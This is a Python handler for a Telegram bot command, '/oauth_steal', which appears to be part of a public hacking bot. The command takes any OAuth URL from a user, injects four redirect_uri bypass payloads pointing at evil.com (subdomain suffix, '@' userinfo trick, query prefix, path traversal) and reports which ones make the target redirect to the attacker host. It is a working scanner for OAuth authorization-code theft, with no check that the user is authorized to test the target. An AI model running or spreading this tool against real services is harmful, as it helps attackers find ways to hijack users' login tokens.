async def cmd_oauth_steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/oauth_steal <url> — OAuth2 Redirect URI Bypass Tester"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown'); return
    if not context.args:
        await update.effective_message.reply_text("📌 *Usage:* `/oauth_steal <oauth_url_with_redirect_uri>`", parse_mode='Markdown'); return
    url = context.args[0].strip()
    safe, reason = is_safe_url(url)
    if not safe:
        await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
    if "redirect_uri=" not in url:
        await update.effective_message.reply_text("❌ URL must contain `redirect_uri` parameter.", parse_mode='Markdown'); return
    msg = await update.effective_message.reply_text("🚀 *OAuth Redirect Bypass Test*\n\n⏳ Testing validation flaws...", parse_mode='Markdown')
    parsed_url = urlparse(url)
    query = dict(re.findall(r'([^&?]+)=([^&?]+)', parsed_url.query))
    original_uri = query.get('redirect_uri', '')
    payloads = [
        original_uri + ".evil.com",
        original_uri.replace("://", "://evil.com@"),
        "https://evil.com/?" + original_uri,
        original_uri + "/../evil.com",
    ]
    findings = []
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12)) as session:
            for p in payloads:
                try:
                    async with session.get(url.replace(original_uri, p), allow_redirects=False, ssl=False) as r:
                        loc = r.headers.get('Location', '')
                        if r.status in (301, 302, 307, 308) and 'evil.com' in loc:
                            findings.append(f"🔴 *VULNERABLE:* `{p[:60]}`\n   └ Redirect: `{loc[:80]}`")
                except Exception:
                    pass
    except Exception as e:
        await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown'); return
    if findings:
        await msg.edit_text("🔥 *OAuth Flaws:*\n\n" + "\n\n".join(findings), parse_mode='Markdown')
    else:
        await msg.edit_text("✅ *redirect_uri strictly validated.*", parse_mode='Markdown')


